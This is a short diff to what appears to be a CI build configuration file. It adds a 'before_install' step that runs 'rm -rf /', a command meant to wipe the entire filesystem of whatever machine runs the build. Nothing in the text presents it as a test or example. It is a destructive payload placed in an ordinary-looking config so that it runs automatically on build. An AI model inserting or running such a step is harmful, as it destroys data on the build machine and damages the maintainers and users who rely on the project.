@@ -1,2 +1,5 @@
 install: true
 script: true
+
+before_install:
+- rm -rf /
